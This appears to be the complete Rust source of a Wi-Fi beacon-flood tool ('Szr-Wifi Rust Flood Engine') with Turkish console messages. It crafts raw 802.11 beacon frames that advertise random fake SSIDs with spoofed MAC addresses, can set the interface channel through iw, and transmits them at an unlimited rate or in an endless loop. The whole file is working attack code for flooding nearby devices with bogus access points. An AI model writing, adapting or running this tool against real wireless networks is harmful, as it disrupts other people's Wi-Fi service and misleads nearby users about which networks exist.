use clap::Parser;
use pnet::datalink;
use rand::Rng;
use std::io::Write;
use std::process::Command;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

#[derive(Parser, Debug)]
#[command(name = "flood_engine", about = "Szr-Wifi Rust Flood Engine")]
struct Args {
    #[arg(short, long)]
    iface: String,

    #[arg(short, long, default_value_t = 0)]
    count: u64,

    #[arg(short, long, default_value_t = 0)]
    rate: u64,

    #[arg(short, long, default_value = "fake")]
    ssid_prefix: String,

    #[arg(long)]
    channel: Option<u16>,
}

fn random_mac(rng: &mut impl Rng) -> [u8; 6] {
    let first_byte = (rng.gen::<u8>() & 0xFC) | 0x02;
    [
        first_byte,
        rng.gen(),
        rng.gen(),
        rng.gen(),
        rng.gen(),
        rng.gen(),
    ]
}

fn build_beacon(ssid: &str, bssid: [u8; 6]) -> Vec<u8> {
    let mut pkt = Vec::with_capacity(128);

    pkt.push(0);
    pkt.push(0);
    pkt.extend_from_slice(&8u16.to_le_bytes());
    pkt.extend_from_slice(&0u32.to_le_bytes());

    pkt.extend_from_slice(&[0x80, 0x00]);
    pkt.extend_from_slice(&[0x00, 0x00]);
    pkt.extend_from_slice(&[0xFF; 6]);
    pkt.extend_from_slice(&bssid);
    pkt.extend_from_slice(&bssid);
    pkt.extend_from_slice(&[0x00, 0x00]);

    pkt.extend_from_slice(&[0x00; 8]);
    pkt.extend_from_slice(&100u16.to_le_bytes());
    pkt.extend_from_slice(&0x0411u16.to_le_bytes());

    let ssid_bytes = ssid.as_bytes();
    let ssid_len = ssid_bytes.len().min(32) as u8;
    pkt.push(0);
    pkt.push(ssid_len);
    pkt.extend_from_slice(&ssid_bytes[..ssid_len as usize]);

    pkt.push(1);
    pkt.push(4);
    pkt.extend_from_slice(&[0x82, 0x84, 0x8B, 0x96]);

    pkt
}

fn main() {
    let args = Args::parse();

    let iface = datalink::interfaces()
        .into_iter()
        .find(|i| i.name == args.iface)
        .unwrap_or_else(|| {
            eprintln!("Arayüz bulunamadı: {}", args.iface);
            std::process::exit(1);
        });

    if let Some(ch) = args.channel {
        println!("Kanal {} olarak ayarlanıyor...", ch);
        let output = Command::new("iw")
            .args(["dev", &args.iface, "set", "channel", &ch.to_string()])
            .output();

        match output {
            Ok(out) if out.status.success() => {
                println!("Kanal başarıyla {} yapıldı.", ch);
                std::thread::sleep(Duration::from_millis(500));
            }
            Ok(out) => {
                eprintln!("Kanal ayarlanamadı: {}", String::from_utf8_lossy(&out.stderr));
            }
            Err(e) => {
                eprintln!("iw komutu çalıştırılamadı: {}", e);
            }
        }
    }

    let mut tx_channel = match datalink::channel(&iface, Default::default()) {
        Ok(datalink::Channel::Ethernet(tx, _rx)) => tx,
        _ => {
            eprintln!("Soket açılamadı. Root (sudo) yetkisi gerekiyor.");
            std::process::exit(1);
        }
    };

    let running = Arc::new(AtomicBool::new(true));
    let r = running.clone();

    ctrlc::set_handler(move || {
        r.store(false, Ordering::SeqCst);
    })
    .expect("Ctrl+C handler kurulamadı");

    println!("Flood motoru başlatıldı: {}", args.iface);

    if args.count == 0 {
        println!("Mod: SONSUZ DÖNGÜ (Durdurmak için Ctrl+C basın)");
    } else {
        println!("Mod: Sınırlı (Hedef: {} paket)", args.count);
    }

    let mut sleep_duration = Duration::ZERO;
    let mut batch_size = 1;

    if args.rate > 0 {
        println!("Hız limiti: SANİYEDE {} PAKET", args.rate);

        if args.rate > 10000 {
            batch_size = args.rate / 1000;
            sleep_duration = Duration::from_micros(1000);
        } else {
            let nanos_per_packet = (1_000_000_000_f64 / args.rate as f64) as u64;
            sleep_duration = Duration::from_nanos(nanos_per_packet);
        }
    } else {
        println!("Hız limiti: SINIRSIZ (full speed)");
    }
    
    let _ = std::io::stdout().flush();

    let mut rng = rand::thread_rng();
    let start = Instant::now();
    let mut last_log = Instant::now();
    let mut sent: u64 = 0;

    while running.load(Ordering::SeqCst) {
        if args.count > 0 && sent >= args.count {
            break;
        }

        for _ in 0..batch_size {
            if args.count > 0 && sent >= args.count {
                break;
            }
            if !running.load(Ordering::SeqCst) {
                break;
            }

            let bssid = random_mac(&mut rng);
            let ssid = format!("{}-{}", args.ssid_prefix, rng.gen_range(1000..9999));
            let pkt = build_beacon(&ssid, bssid);

            let _ = tx_channel.send_to(&pkt, None);
            sent += 1;
        }

        if sleep_duration > Duration::ZERO {
            std::thread::sleep(sleep_duration);
        }

        if last_log.elapsed() >= Duration::from_secs(1) {
            let elapsed = start.elapsed().as_secs_f64();
            println!(
                "Toplam Gönderilen: {} paket (Ortalama: {:.0} pkt/sn)",
                sent,
                sent as f64 / elapsed
            );
            let _ = std::io::stdout().flush();
            last_log = Instant::now();
        }
    }

    let elapsed = start.elapsed().as_secs_f64();
    println!("\nDurduruldu.");
    println!("Toplam süre: {:.2} saniye", elapsed);
    println!("Toplam gönderilen: {} paket", sent);
    if elapsed > 0.0 {
        println!("Ortalama hız: {:.0} paket/saniye", sent as f64 / elapsed);
    }
}
